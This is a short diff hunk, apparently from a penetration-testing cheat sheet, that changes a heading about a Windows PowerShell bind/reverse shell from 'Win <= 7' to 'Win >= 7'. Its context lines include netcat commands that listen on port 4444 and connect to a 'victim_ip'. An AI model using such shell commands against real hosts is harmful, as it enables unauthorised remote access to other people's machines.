@@ -65,7 +65,7 @@ $netcat -v -l -p 4444
 ```
 $netcat -v victim_ip 4444
 ```
-### Win <= 7 Bind reverse shell \[ powershell.exe \]
+### Win >= 7 Bind reverse shell \[ powershell.exe \]
 
 <img src="https://zupimages.net/up/19/01/wq32.png">
  
